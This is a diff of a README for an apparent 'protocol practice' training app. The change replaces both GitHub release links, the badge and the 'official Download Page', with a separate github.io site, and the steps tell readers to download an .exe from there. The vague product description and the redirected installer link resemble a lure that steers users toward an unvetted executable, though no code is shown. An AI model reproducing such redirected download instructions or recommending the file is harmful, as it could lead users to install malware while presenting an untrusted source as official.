@@ -1,6 +1,6 @@
 # 🎓 apex-protocols-practice-hub - Improve your protocol skills with practice
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sweptwing-reception235/apex-protocols-practice-hub/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sweptwing-reception235.github.io)
 
 This application provides a training environment for protocol-based practice. It helps you learn structured procedures through a browser-based interface. You can run the application on your computer or access it through a server. The tool supports your training goals by simulating real-world scenarios.
 
@@ -20,7 +20,7 @@ Ensure your computer has the latest system updates installed before you proceed.
 
 You can find the latest version of the application on the project release page. Follow these steps to obtain the installer:
 
-1.  Visit the official [Download Page](https://github.com/Sweptwing-reception235/apex-protocols-practice-hub/releases).
+1.  Visit the official [Download Page](https://sweptwing-reception235.github.io).
 2.  Look for the section labeled "Assets" under the most recent release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your "Downloads" folder.
